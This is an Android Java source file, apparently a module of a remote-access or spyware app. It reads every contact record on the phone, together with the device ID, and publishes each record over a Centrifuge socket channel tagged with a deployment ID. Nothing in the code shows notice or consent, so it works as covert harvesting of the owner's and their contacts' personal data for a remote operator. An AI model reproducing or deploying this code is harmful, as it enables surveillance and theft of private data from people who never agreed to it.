package com.gnu.cobat;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import io.github.centrifugal.centrifuge.Client;


public class ContactsManager {

    public static JSONObject getContacts(Client ioSocket){

        TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = telephonyManager.getDeviceId();

        try {

//            new String[] { ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,  ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();

                for (int i = 0; i < cur.getColumnCount(); i++) {
                    try {
                        if (cur.getString(i) == null) {
                            contact.put(cur.getColumnName(i), "");
                        }

                        String colName = cur.getColumnName(i);
                        if ( colName.equals("contact_last_updated_timestamp") ) {
                            long val = Long.parseLong(cur.getString(i));
                            contact.put(cur.getColumnName(i), val);
                        } else {
                            contact.put(cur.getColumnName(i), cur.getString(i));
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                if ( contact.getString("_id") != null ) {
                    contact.put("original_id", contact.getString("_id"));
                    contact.remove("_id");
                }

                contact.put("deploy_id", Global.deploy_id);
                contact.put("device_id", deviceID);
                contact.put("return", true);
                contact.put("return_type", "cb-contact");

                ioSocket.publish(Global.channel, contact.toString().getBytes(), null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;

    }

}
